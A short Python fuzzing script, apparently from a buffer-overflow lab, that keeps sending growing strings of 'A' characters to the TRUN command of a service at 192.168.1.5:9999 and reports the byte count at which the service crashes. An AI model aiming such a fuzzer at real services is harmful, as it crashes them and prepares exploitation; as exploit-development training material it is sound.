#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.5',9999))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print("""
        
         / _ \  ___   ___ |  _ \ ___| |  
        | | | |/ _ \ / _ \| |_) / __| |  
        | |_| | (_) | (_) |  __/\__ \_|  
         \___/ \___/ \___/|_|   |___(_)  
                                   
         """
        )
        print("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()